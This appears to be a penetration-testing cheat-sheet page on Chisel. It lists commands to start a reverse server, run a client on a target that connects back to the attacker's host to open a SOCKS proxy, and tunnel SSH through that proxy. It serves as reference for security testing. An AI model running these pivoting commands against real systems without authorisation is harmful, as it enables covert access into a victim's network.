---
layout: default
title: Chisel
parent: Network
nav_order: 1
permalink: /network/chisel/
---

# Chisel
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

```bash
# Start chisel server on your environement
chisel server --port LPORT --reverse

# Start chisel client on a target
chisel client $LHOST:$LPORT R:socks

# Check SOCKS proxy is up
ss -ntplu

# Create a proxyfied ssh tunnel through the chisel client to your target
ssh -o ProxyCommand="ncat --proxy-type socks5 --proxy 127.0.0.1:$SOCKS_PORT %h %p" $USERNAME@$TARGET
```